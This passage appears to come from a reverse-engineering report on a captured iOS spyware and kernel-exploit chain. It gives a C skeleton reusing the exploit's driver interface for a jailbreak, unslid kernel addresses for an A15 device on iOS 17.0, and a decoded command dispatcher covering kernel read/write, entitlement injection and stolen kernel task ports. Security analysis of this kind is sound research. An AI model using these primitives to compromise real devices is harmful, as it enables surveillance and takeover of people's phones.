#### 8.4.6 Code Skeleton — Integration into _startl

```c
// In our replacement type 0x08 (jailbreak_bootstrap.c)

int _startl(void *context, driver_interface_t *drv) {
    // Validate driver interface
    if (!drv || drv->version != 2 || drv->sub_version < 2)
        return 0xad001;

    // ── Phase 1: Userspace CVE-2024-27840 Stage 1 probe ──
    // No kernel primitives needed, just Mach traps
    int stage1_vuln = cve_2024_27840_test_stage1();
    if (drv->log_enabled)  // context+0x5eb
        log_callback(context, stage1_vuln ? 0xCC200 : 0xCC201, 0, 0x27840001);

    // ── Phase 2: Kernel version confirmation ──
    char kinfo[0x200] = {0};
    int kr = drv->get_kernel_info(drv, kinfo);
    if (kr == 0) {
        // Parse "xnu-" version from kinfo
        // Confirm iOS ≤17.4 (xnu < 10063.121.x)
    }

    // ── Phase 3: Use kernel primitives for jailbreak ──
    void *state = NULL;
    drv->init_state(drv, 0, &state);

    // Apply AMFI patch, sandbox patch, etc. via kpatch/batch_patch
    // ...

    drv->commit_state(drv, state);
    drv->release_state(drv, state);

    // ── Phase 4 (future): Full kernel-context CVE test ──
    // Requires RE of type 0x09 internals for raw kernel function calls
    // See Strategy B/C above

    return 0;
}
```

#### 8.4.7 Key Kernel Addresses for CVE-2024-27840 Test (iPhone14,3, A15, iOS 17.0)

These are the verified addresses from previous sessions that would be used in a kernel-context test:

| Symbol | Unslid Address | Source |
|--------|---------------|--------|
| kernel base | 0xfffffff027004000 | Mach-O __TEXT vmaddr |
| kernel_task | 0xfffffff0278fccb0 | Ghidra: panic pattern |
| kernel_proc | 0xfffffff027900428 | Ghidra: LIST_INSERT_HEAD |
| allproc | 0xfffffff02a2bd308 | Ghidra: allproc init |
| vm_fault_enter_prepare | (need Ghidra lookup) | Contains dead assert |
| pmap_has_prot_policy | (need Ghidra lookup) | Called by vm_fault_enter_prepare |
| kernel_map | (need Ghidra lookup) | Required for vm_map_enter_mem_object |

**SPTM constraint**: On A15 with SPTM (iOS 17.0), only XNU_DEFAULT typed pages are vulnerable to CVE-2024-27840. Pages in pmap_ro_zone, PPL regions, or page tables have hardware-enforced protections that this bypass alone cannot defeat. Kernel heap data (struct ucred, struct task, IOKit objects) is XNU_DEFAULT and IS vulnerable.

---

## 9. Type 0x09 Internals — Full Command Dispatcher (NOT a Simple Patch API)

**CRITICAL REVISION**: The `kpatch` function at driver_interface+0x28 is **NOT** a simple memory writer. `FUN_0003e580` is a **full post-exploitation command dispatcher** (3000+ lines decompiled). The driver_interface_t wraps a complete jailbreak toolkit.

### 9.1 Command ID Format

```
param_2 (uint32_t command_id):

  Bits 31-30: Flags
    0x00000000 = no output
    0x40000000 = output to param_3
    0x80000000 = bidirectional (read+write param_3)
    0xC0000000 = kernel-context operation

  Bits 15-8: Category
    0x00 = Process/task operations
    0x01 = Query/info operations
    0x03 = Advanced kernel operations

  Bits 7-0: Command number
```

### 9.2 State Object (0x1D60 = 7520 bytes)

Created by `init_state` → `FUN_0003e42c` → `calloc(0x1D60, 1)`. Key fields:

| Offset | Field |
|--------|-------|
| +0x00 | flags/capabilities bitmap |
| +0x50 | kernel version info (from platform detect) |
| +0x60 | page size |
| +0x140 | **XNU version ID** (0x1809=iOS14, 0x1c1b=iOS15, 0x1f53/0x1f54=iOS16, 0x2258/0x225c/0x2712=iOS17+) |
| +0x158 | platform version threshold (64-bit, compared with shifts) |
| +0x264 | semaphore |
| +0x268, +0x330 | pthread mutexes |
| +0x370 | linked list head (Mach port entries) |
| +0x646 | kernel task port |
| +0x648 | host_priv port |
| +0x672 | kernel_proc pointer |
| +0x678 | **kernel slide** |
| +0x67A | **kernel text base** |
| +0x67C | **kernel text end** |
| +0x746 | sandbox kext patch struct |
| +0x748 | **AMFI kext patch struct** |
| +0x1918 | **stolen kernel task port** |
| +0x1920 | host_priv port (used by mach_vm_wire) |
| +0x192C | current thread port |
| +0x1930-0x1940 | 5 file descriptors (exploit pipes, init -1) |

### 9.3 Discovered Commands

#### Process/Task Operations (category 0)

| ID | Name | What It Does |
|----|------|-------------|
| 0x01 | **kread_proc** | Reads proc struct fields — finds current proc via `FUN_00033e8c`, reads p_ucred/task at version-dependent offsets. **KREAD PRIMITIVE.** |
| 0x03 | **inject_entitlement** | `FUN_0001503c(state, port, "<dict><key>task_for_pid-allow</key><true/></dict>", 0)` — **INJECTS ENTITLEMENTS** |
| 0x07 | thread_setup | `mach_thread_self()` → state+0x192C |
| 0x08 | init_op | `FUN_0003a150(state, 0, 0, 0)` |
| 0x0A | cache_op | `FUN_00023d30(state, 1)` |
| 0x1F | **task_port_setup** | `FUN_0003c9a4` + `FUN_0003c450` — **KERNEL TASK PORT ACCESS** |
| 0x40000021 | **mach_vm_wire** | Directly calls `mach_vm_wire(host_priv, task, addr, size, prot)` — **KERNEL MEMORY WIRING** |
| 0x4000001B | **kernel_rw** | `FUN_0003ae94(state, port, ...)` — **RAW KERNEL READ/WRITE** (after capability check) |
| 0x4000001E | vm_remap | `FUN_0003be3c(state, port, ...)` — VM remapping operation |
| 0x4000000E | vm_map_op | `FUN_0002ed14(state, ...)` — VM mapping with 6 parameters |
| 0x40000012 | vm_map_op2 | `FUN_0002ed14` variant with different flags |

#### Query/Info Operations (category 1)

| ID | Name | What It Does |
|----|------|-------------|
| 0x109 | state_step | `FUN_00014524(state)` — exploit state machine transition |
| 0x10C | file_read | Opens file via `_open()`, reads contents |
| 0x80000109 | **read_state** | `FUN_00013ebc(state, &output)` — reads current exploit state value |
| 0xC000010B | **capabilities** | Returns bitmap: bit0=kernel_rw, bit1=sandbox_esc, bit2=codesign_bypass, bit3=persistence |
| 0x8000010D | dev_mode_query | `FUN_0003f9a0(state, &output)` |

#### Advanced Kernel Operations (category 3)

| ID | Name | What It Does |
|----|------|-------------|
| 0x40000305 | kexec_setup | `FUN_0001f900(state, ...)` — 6-parameter kernel operation |
| 0xC0000303 | kernel_op | `FUN_0001fa7c(state, ...)` — kernel-context operation |
| 0xC000001D | kernel_write | `FUN_0003bc94(state, ...)` |
| 0xC000001B | kernel_patch | `FUN_0003b524(state, ...)` — with sandbox/capability checks |

### 9.4 Core Init (FUN_0003cca8) — Exploit Sequence

1. **Anti-VM**: Checks `IOPlatformSerialNumber` for "CORELLIUM" prefix
2. **Platform detect**: Identifies XNU version, CPU type, hw.model
3. **Version-dependent exploit path**:
   - iOS ≤15: `FUN_0001c0c8`
   - iOS 16 (no sandbox): `FUN_0001c3ec`
   - iOS 16+ (sandboxed): `FUN_0001d70c`
   - iOS 17+ arm64e: `FUN_0000b460`
4. **Kernel task port**: `host_get_special_port(host, -1, 16, &port)` — retrieves planted port
5. **Kernel base/slide**: Resolves via `FUN_0003c398`
6. **kernel_proc**: Located via `FUN_00039888` or slide calculation
7. **AMFI analysis**: Finds kext, reads `developer_mode_status` + `allows_security_research`
8. **Sandbox analysis**: Finds `com.apple.security.sandbox` kext for patching

### 9.5 Revised driver_interface_t

```c
typedef struct {
    int16_t  version;           // +0x00: 2
    int16_t  sub_version;       // +0x02: 2
    uint8_t  reserved[12];      // +0x04: zero

    // All PAC-signed with paciza
    void*    cleanup;           // +0x10: destroy state object
    void*    init_state;        // +0x18: create 0x1D60-byte exploit state
    void*    release_state;     // +0x20: full cleanup (ports, FDs, mutexes, memory)
    void*    execute_command;   // +0x28: FULL COMMAND DISPATCHER (FUN_0003e580)
    void*    commit_operations; // +0x30: commit pending kernel operations (FUN_0003f2e0)
    void*    get_exploit_info;  // +0x38: query exploit capabilities/state
    void*    batch_execute;     // +0x40: batch command execution
    void*    get_kernel_info;   // +0x48: XNU version string parser
} driver_interface_t;           // 0x50 = 80 bytes
```

### 9.6 CVE-2024-27840 — NOW TESTABLE

The command dispatcher provides everything needed:

| What We Need | Command | Verified |
|-------------|---------|----------|
| Kernel R/W | 0x4000001B | Yes — `FUN_0003ae94` |
| mach_vm_wire | 0x40000021 | Yes — direct `mach_vm_wire()` call |
| VM remap | 0x4000001E | Yes — `FUN_0003be3c` |
| VM map | 0x4000000E | Yes — `FUN_0002ed14` |
| Read proc creds | 0x01 | Yes — version-aware proc struct reader |
| Capability check | 0xC000010B | Yes — bitmap query |
| host_priv port | state+0x1920 | Yes — from `host_get_special_port` |

**The exploit IS a complete jailbreak toolkit. CVE-2024-27840 kernel-context test is fully achievable through the command interface.**

---

## 10. Files Reference

| File | Description |
|------|-------------|
| `payloads/bootstrap.dylib` | The loader (89KB arm64) — RE'd in §2-4 |
| `payloads/377bed74.../entry0_type0x08.dylib` | Spyware implant (228KB arm64e) — RE'd in §4 |
| `payloads/377bed74.../entry1_type0x09.dylib` | Kernel exploit (333KB arm64e) — RE'd in §5, §9 |
| `payloads/377bed74.../entry2_type0x0f.dylib` | Persistence module (191KB arm64e) |
| `payloads/377bed74.../entry4_type0x05.bin` | Kernel offsets/gadgets (24KB) |
| `Stage3_VariantB.js` | Lines 1184–1269: buildContainer(); Lines 1329–1420: executeSandboxEscape() |
| `payloads/manifest.json` | F00DBEEF entry manifest for all 19 payload bundles |

---

## 11. Remaining Work

1. **RE individual command implementations** — particularly `FUN_0003ae94` (command 0x4000001B, raw kernel R/W) and `FUN_0003be3c` (command 0x4000001E, VM remap) to understand exact parameter structures.

2. **RE the type 0x05 kernel offsets blob** (`entry4_type0x05.bin`, 24KB) — offset table format used by exploit to find patch targets.

3. **Update `jailbreak_bootstrap.c`** with correct `driver_interface_t`, correct export signatures (`_start/_startl/_startr/_startm`), and command-based kernel access.
